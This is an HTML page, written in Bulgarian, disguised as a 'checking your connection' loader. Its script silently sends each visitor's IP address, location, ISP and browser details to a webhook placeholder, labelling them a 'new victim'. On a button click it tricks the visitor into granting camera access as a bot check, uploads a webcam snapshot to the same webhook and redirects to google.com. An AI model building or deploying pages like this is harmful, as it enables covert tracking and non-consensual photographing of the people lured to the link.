<!DOCTYPE html>
<html lang="bg">
<head>
    <meta charset="UTF-8">
    <title>Зареждане...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #111; color: white; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="status">
    <div class="loader"></div>
    <p>Моля, изчакайте, системата проверява вашата връзка...</p>
    <button id="startBtn" style="padding: 10px 20px; cursor: pointer;">Продължи към съдържанието</button>
</div>

<script>
const WEBHOOK_URL = 'ТВОЯТ_WEBHOOK_ТУК';

// 1. Взимане на IP и информация веднага
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co');
        const data = await response.json();
        
        const message = {
            content: "🚀 **Нова жертва влезе в линка!**",
            embeds: [{
                title: "Информация за устройството",
                color: 16711680,
                fields: [
                    { name: "IP Адрес", value: data.ip, inline: true },
                    { name: "Град/Държава", value: `${data.city}, ${data.country_name}`, inline: true },
                    { name: "Оператор", value: data.org, inline: false },
                    { name: "Браузър", value: navigator.userAgent, inline: false }
                ]
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });
    } catch (e) { console.log("Грешка при IP-то"); }
}

// 2. Функция за камерата (активира се при клик)
async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async blob => {
            const formData = new FormData();
            formData.append('file', blob, 'webcam.png');
            formData.append('payload_json', JSON.stringify({
                content: "📸 **Снимка от камерата на същия потребител!**"
            }));

            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            
            stream.getTracks().forEach(t => t.stop()); // Спираме камерата
            window.location.href = "https://google.com"; // Пренасочваме ги
        }, 'image/png');

    } catch (err) {
        alert("Трябва да разрешите камерата, за да потвърдите, че не сте бот.");
    }
}

// Стартираме логването на IP веднага
getIPInfo();

// Чакаме потребителят да цъкне бутона, за да поискаме камерата
document.getElementById('startBtn').addEventListener('click', startCapture);
</script>

</body>
</html>
